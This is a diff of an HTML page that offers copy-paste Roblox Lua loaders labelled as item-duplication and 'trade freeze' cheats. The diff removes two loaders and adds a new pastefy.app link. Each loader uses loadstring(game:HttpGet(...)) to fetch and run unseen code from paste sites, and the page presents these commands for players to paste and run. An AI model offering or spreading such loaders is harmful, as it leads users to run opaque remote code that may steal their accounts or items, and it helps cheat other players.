@@ -288,18 +288,8 @@ textarea{
 
   <div class="scripts" id="scriptsbrainrot">
     <div class="script-box">
-      <div class="script-label">📋 Dupe Script</div>
-      <textarea readonly>loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/L4cByz8CzcDky1CE/raw", true))()</textarea>
-      <button class="copy" onclick="copyBrainrot(this)">Copy</button>
-    </div>
-    <div class="script-box">
-      <div class="script-label">❄️ Trade Freeze Script</div>
-      <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/DO2u9XdL/raw", true))()</textarea>
-      <button class="copy" onclick="copyBrainrot(this)">Copy</button>
-    </div>
-    <div class="script-box">
       <div class="script-label">🔥 Dupe + Trade Freeze</div>
-      <textarea readonly>loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidScriptzz/VoidsTradeFreeze-DupeScript/main/SAB.lua.txt"))()</textarea>
+      <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/odvJ80lq/raw", true))()</textarea>
       <button class="copy" onclick="copyBrainrot(this)">Copy</button>
     </div>
     <div class="script-box">
